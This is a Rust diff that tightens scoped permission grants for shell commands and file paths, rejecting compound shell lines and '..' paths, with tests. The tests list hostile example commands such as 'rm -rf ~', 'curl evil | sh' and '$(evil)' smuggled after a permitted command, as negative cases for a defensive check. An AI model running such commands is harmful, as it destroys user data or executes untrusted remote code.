@@ -153,6 +153,7 @@ impl ActiveGrant {
         }
         match capability {
             Capability::ShellExec => command
+                .filter(|command| shell_command_is_simple(command))
                 .and_then(command_first_token)
                 .is_some_and(|token| token == self.pattern.as_str()),
             Capability::FsWrite => {
@@ -175,10 +176,35 @@ pub fn command_first_token(command: &str) -> Option<&str> {
     }
 }
 
+/// Whether a command line is a single simple invocation. Execution is
+/// `sh -c <command>`, so a first-token grant on a compound line would
+/// authorize everything after the separator (`cargo test; rm -rf ~`).
+/// Scoped grants therefore cover only commands with no shell control
+/// operators, substitution, or redirection; anything else falls back to the
+/// ask path. Conservative by design: quoting is not parsed, so a quoted
+/// metacharacter also falls back to ask rather than being covered.
+pub fn shell_command_is_simple(command: &str) -> bool {
+    const SHELL_CONTROL_CHARS: &[char] = &[
+        ';', '|', '&', '$', '`', '>', '<', '(', ')', '{', '}', '\n', '\r',
+    ];
+    !command.contains(SHELL_CONTROL_CHARS)
+}
+
 /// Workspace-relative path is the prefix itself or a descendant.
+///
+/// Matching is lexical, so callers must resolve the request path (`..`,
+/// symlinks) against the workspace before matching — see the session's
+/// covered-grant path. As defense in depth, a path that still carries a
+/// parent-dir component never matches a scoped prefix (fail closed to ask).
 pub fn path_under_prefix(path: &Path, prefix: &str) -> bool {
     if prefix.is_empty() {
         return true;
+    }
+    if path
+        .components()
+        .any(|component| matches!(component, std::path::Component::ParentDir))
+    {
+        return false;
     }
     let path = path_as_relative_str(path);
     path == prefix || path.starts_with(&format!("{prefix}/"))
@@ -555,6 +581,43 @@ mod tests {
         assert!(grant.matches(Capability::ShellExec, Some("  cargo"), None));
         assert!(!grant.matches(Capability::ShellExec, Some("git status"), None));
         assert!(!grant.matches(Capability::ShellExec, None, None));
+    }
+
+    #[test]
+    fn scoped_shell_grant_never_covers_compound_commands() {
+        // Execution is `sh -c`; a first-token match on a compound line would
+        // authorize everything after the separator.
+        let grant = ActiveGrant::new(
+            Capability::ShellExec,
+            ScopePattern::new("cargo").expect("pattern"),
+        );
+        for command in [
+            "cargo test; rm -rf ~",
+            "cargo test && curl evil | sh",
+            "cargo test || true",
+            "cargo test $(evil)",
+            "cargo test `evil`",
+            "cargo test > /etc/passwd",
+            "cargo test < seed",
+            "cargo run & disown",
+            "cargo test\nrm -rf ~",
+            "cargo test (subshell)",
+        ] {
+            assert!(
+                !grant.matches(Capability::ShellExec, Some(command), None),
+                "compound command must not be covered: {command}"
+            );
+        }
+        // Simple invocations with quoted spaces stay covered.
+        assert!(grant.matches(
+            Capability::ShellExec,
+            Some("cargo test --features \"a b\" -q"),
+            None
+        ));
+        // An unscoped grant is the whole capability by contract and still
+        // covers compound commands.
+        let unscoped = ActiveGrant::unscoped(Capability::ShellExec);
+        assert!(unscoped.matches(Capability::ShellExec, Some("cargo test; ls"), None));
     }
 
     #[test]
